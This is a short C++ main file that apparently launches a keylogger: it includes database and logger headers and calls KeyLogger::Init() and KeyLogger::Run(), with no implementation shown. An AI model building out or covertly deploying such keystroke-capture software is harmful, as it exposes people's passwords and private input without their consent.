#include <iostream>
#include "db/db.hpp"
#include "logger/logger.hpp"

int main(int argc, const char *argv[]) {
    KeyLogger::Init();
    KeyLogger::Run();

    return 0;
}